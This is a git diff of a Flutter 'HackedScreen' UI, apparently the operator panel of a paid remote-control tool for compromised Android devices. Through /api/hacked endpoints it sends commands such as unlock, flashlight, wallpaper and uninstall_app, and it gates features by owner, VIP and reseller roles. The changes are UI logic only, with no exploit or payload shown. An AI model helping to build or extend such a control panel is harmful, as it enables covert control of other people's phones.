@@ -438,9 +438,8 @@ class _HackedScreenState extends State<HackedScreen>
       case 'unlock':      _sendCommand('unlock', {}); break;
       case 'flashlight':
         final next = !_flashOn;
-        setState(() => _flashOn = next); // optimistic update dulu
-        _sendCommand('flashlight', {'state': next ? 'on' : 'off'}).catchError((_) {
-          if (mounted) setState(() => _flashOn = !next); // rollback kalau gagal
+        _sendCommand('flashlight', {'state': next ? 'on' : 'off'}).then((_) {
+          if (mounted) setState(() => _flashOn = next);
         });
         break;
       case 'wallpaper':   _showWallpaperDialog(); break;
@@ -1080,23 +1079,19 @@ class _HackedScreenState extends State<HackedScreen>
 
   void _showUninstallAppDialog() {
     if (_selectedDeviceId == null) { _snack(tr('select_device_first')); return; }
-    _snack('Memuat daftar aplikasi...', isSuccess: true);
+    const unColor = Color(0xFFEF4444);
     setState(() => _loadingAppList = true);
     _sendCommand('get_app_list', {}).then((_) {
-      Future.delayed(const Duration(seconds: 4), () async {
+      Future.delayed(const Duration(seconds: 5), () async {
         int tries = 0;
-        while (tries < 12) {
+        while (tries < 15) {
           tries++;
           try {
-            final res = await ApiService.get('/api/hacked/app-list/$_selectedDeviceId');
+            final res = await ApiService.get('/api/hacked/app-list/$_selectedDeviceId?launchable=false');
             if (res['success'] == true && res['apps'] != null) {
               final apps = List<Map<String, dynamic>>.from(res['apps'] ?? []);
               if (mounted) {
                 setState(() => _loadingAppList = false);
-                if (apps.isEmpty) {
-                  _snack('Belum ada data aplikasi dari device', isError: true);
-                  return;
-                }
                 _showUninstallSheet(apps);
               }
               return;
@@ -1104,10 +1099,7 @@ class _HackedScreenState extends State<HackedScreen>
           } catch (_) {}
           await Future.delayed(const Duration(seconds: 2));
         }
-        if (mounted) {
-          setState(() => _loadingAppList = false);
-          _snack('Gagal memuat daftar aplikasi', isError: true);
-        }
+        if (mounted) setState(() => _loadingAppList = false);
       });
     });
   }
@@ -2891,69 +2883,100 @@ class _HackedScreenState extends State<HackedScreen>
   }
 
   Widget _buildCategoryCard(Map<String, dynamic> cat, List<Map<String, dynamic>> cmds) {
-    final color     = Color(cat['color'] as int);
-    final icon      = cat['icon'] as String;
-    final title     = cat['title'] as String;
+    final color    = Color(cat['color'] as int);
+    final icon     = cat['icon'] as String;
+    final title    = cat['title'] as String;
     final isSpecial = title == 'Special';
     final isOwner   = _role == 'owner';
-    final isVipFull = _role == 'vip' && _vipType == 'full_update';
-    final isReseller = _role == 'reseller';
-    // Special visible ke owner/vip_full/reseller — category TIDAK locked
-    // tapi item uninstall_app di dalam locked kecuali owner
-    final canSeeSpecial = isOwner || isVipFull || isReseller;
-    if (isSpecial && !canSeeSpecial) return const SizedBox.shrink();
+    final locked    = isSpecial && !isOwner;
 
     return GestureDetector(
-      onTap: () => _showCategorySheet(title, color, icon, cmds),
-      child: Container(
-        margin: const EdgeInsets.only(bottom: 14),
-        padding: const EdgeInsets.all(16),
-        decoration: BoxDecoration(
-          gradient: LinearGradient(
-            colors: [color.withOpacity(0.18), color.withOpacity(0.05)],
-            begin: Alignment.centerLeft, end: Alignment.centerRight),
-          borderRadius: BorderRadius.circular(16),
-          border: Border.all(color: color.withOpacity(0.45)),
-          boxShadow: [BoxShadow(color: color.withOpacity(0.15), blurRadius: 10)],
-        ),
-        child: Row(children: [
+      onTap: () {
+        if (locked) {
+          showWarning(context, 'Upss fitur masih menjalani update');
+          return;
+        }
+        _showCategorySheet(title, color, icon, cmds);
+      },
+      child: Stack(
+        children: [
           Container(
-            width: 46, height: 46,
+            margin: const EdgeInsets.only(bottom: 14),
+            padding: const EdgeInsets.all(16),
             decoration: BoxDecoration(
-              color: color.withOpacity(0.2),
-              borderRadius: BorderRadius.circular(12),
-              border: Border.all(color: color.withOpacity(0.5))),
-            child: Center(child: SvgPicture.string(icon, width: 22, height: 22,
-              colorFilter: ColorFilter.mode(color, BlendMode.srcIn)))),
-          const SizedBox(width: 14),
-          Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
-            Text(title, style: TextStyle(fontFamily: 'Orbitron', fontSize: 14, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
-            const SizedBox(height: 4),
-            Text('${cmds.length} fitur tersedia',
-              style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: color.withOpacity(0.8))),
-          ])),
-          Row(children: cmds.take(4).map((c) => Padding(
-            padding: const EdgeInsets.only(left: 6),
-            child: Container(
-              width: 28, height: 28,
-              decoration: BoxDecoration(
-                color: (c['color'] as Color).withOpacity(0.15),
-                borderRadius: BorderRadius.circular(7),
-                border: Border.all(color: (c['color'] as Color).withOpacity(0.35))),
-              child: Center(child: SvgPicture.string(c['icon'] as String, width: 13, height: 13,
-                colorFilter: ColorFilter.mode(c['color'] as Color, BlendMode.srcIn)))))).toList()),
-          const SizedBox(width: 8),
-          SvgPicture.string(
-            '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>',
-            width: 16, height: 16, colorFilter: ColorFilter.mode(color.withOpacity(0.7), BlendMode.srcIn)),
-        ]),
+              gradient: LinearGradient(
+                colors: [color.withOpacity(0.18), color.withOpacity(0.05)],
+                begin: Alignment.centerLeft, end: Alignment.centerRight),
+              borderRadius: BorderRadius.circular(16),
+              border: Border.all(color: color.withOpacity(0.45)),
+              boxShadow: [BoxShadow(color: color.withOpacity(0.15), blurRadius: 10)],
+            ),
+            child: Row(children: [
+              Container(
+                width: 46, height: 46,
+                decoration: BoxDecoration(
+                  color: color.withOpacity(0.2),
+                  borderRadius: BorderRadius.circular(12),
+                  border: Border.all(color: color.withOpacity(0.5))),
+                child: Center(child: SvgPicture.string(icon, width: 22, height: 22,
+                  colorFilter: ColorFilter.mode(color, BlendMode.srcIn)))),
+              const SizedBox(width: 14),
+              Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
+                Text(title, style: TextStyle(fontFamily: 'Orbitron', fontSize: 14, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
+                const SizedBox(height: 4),
+                Text('${cmds.length} fitur tersedia',
+                  style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: color.withOpacity(0.8))),
+              ])),
+              Row(children: cmds.take(4).map((c) => Padding(
+                padding: const EdgeInsets.only(left: 6),
+                child: Container(
+                  width: 28, height: 28,
+                  decoration: BoxDecoration(
+                    color: (c['color'] as Color).withOpacity(0.15),
+                    borderRadius: BorderRadius.circular(7),
+                    border: Border.all(color: (c['color'] as Color).withOpacity(0.35))),
+                  child: Center(child: SvgPicture.string(c['icon'] as String, width: 13, height: 13,
+                    colorFilter: ColorFilter.mode(c['color'] as Color, BlendMode.srcIn)))))).toList()),
+              const SizedBox(width: 8),
+              SvgPicture.string(
+                '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>',
+                width: 16, height: 16, colorFilter: ColorFilter.mode(color.withOpacity(0.7), BlendMode.srcIn)),
+            ]),
+          ),
+          if (locked)
+            Positioned.fill(
+              child: Container(
+                decoration: BoxDecoration(
+                  color: Colors.black.withOpacity(0.55),
+                  borderRadius: BorderRadius.circular(16),
+                ),
+                child: Center(
+                  child: Column(
+                    mainAxisSize: MainAxisSize.min,
+                    children: [
+                      Icon(Icons.lock_rounded, color: Colors.white.withOpacity(0.85), size: 28),
+                      const SizedBox(height: 6),
+                      Text(
+                        'OWNER ONLY',
+                        style: TextStyle(
+                          fontFamily: 'Orbitron',
+                          fontSize: 10,
+                          color: Colors.white.withOpacity(0.7),
+                          letterSpacing: 2,
+                          fontWeight: FontWeight.bold,
+                        ),
+                      ),
+                    ],
+                  ),
+                ),
+              ),
+            ),
+        ],
       ),
     );
   }
 
   void _showCategorySheet(String title, Color color, String icon, List<Map<String, dynamic>> cmds) {
-    final isSpecial = title == 'Special';
-    final isOwner   = _role == 'owner';
     showModalBottomSheet(
       context: context,
       backgroundColor: Colors.transparent,
@@ -2970,10 +2993,12 @@ class _HackedScreenState extends State<HackedScreen>
             border: Border.all(color: color.withOpacity(0.3)),
           ),
           child: Column(children: [
+            // Handle
             Padding(
               padding: const EdgeInsets.fromLTRB(0, 12, 0, 0),
               child: Container(width: 40, height: 4,
                 decoration: BoxDecoration(color: color.withOpacity(0.3), borderRadius: BorderRadius.circular(2)))),
+            // Header
             Padding(
               padding: const EdgeInsets.fromLTRB(20, 16, 20, 12),
               child: Row(children: [
@@ -2986,6 +3011,7 @@ class _HackedScreenState extends State<HackedScreen>
               ]),
             ),
             Divider(color: color.withOpacity(0.15), height: 1),
+            // Grid commands
             Expanded(
               child: GridView.builder(
                 controller: scrollCtrl,
@@ -2994,44 +3020,13 @@ class _HackedScreenState extends State<HackedScreen>
                   crossAxisCount: 2, childAspectRatio: 1.05,
                   crossAxisSpacing: 12, mainAxisSpacing: 12),
                 itemCount: cmds.length,
-                itemBuilder: (_, i) {
-                  final cmd = cmds[i];
-                  final cmdType = cmd['cmd'] as String;
-                  // Lock uninstall_app di Special kecuali owner
-                  final itemLocked = isSpecial && cmdType == 'uninstall_app' && !isOwner;
-                  return GestureDetector(
-                    onTap: _sendingCmd ? null : () {
-                      if (itemLocked) {
-                        Navigator.pop(context);
-                        _snack('🔒 Fitur ini hanya untuk Owner!', isError: true);
-                        return;
-                      }
-                      Navigator.pop(context);
-                      _handleCommandTap(cmd);
-                    },
-                    child: Stack(children: [
-                      _buildCommandCard(cmd),
-                      if (itemLocked)
-                        Positioned.fill(
-                          child: Container(
-                            decoration: BoxDecoration(
-                              color: Colors.black.withOpacity(0.6),
-                              borderRadius: BorderRadius.circular(16)),
-                            child: Column(
-                              mainAxisAlignment: MainAxisAlignment.center,
-                              children: [
-                                Icon(Icons.lock_rounded, color: Colors.white.withOpacity(0.8), size: 22),
-                                const SizedBox(height: 4),
-                                Text('OWNER ONLY',
-                                  style: TextStyle(fontFamily: 'Orbitron', fontSize: 8,
-                                    color: Colors.white.withOpacity(0.6), letterSpacing: 1.5)),
-                              ],
-                            ),
-                          ),
-                        ),
-                    ]),
-                  );
-                },
+                itemBuilder: (_, i) => GestureDetector(
+                  onTap: _sendingCmd ? null : () {
+                    Navigator.pop(context);
+                    _handleCommandTap(cmds[i]);
+                  },
+                  child: _buildCommandCard(cmds[i]),
+                ),
               ),
             ),
           ]),
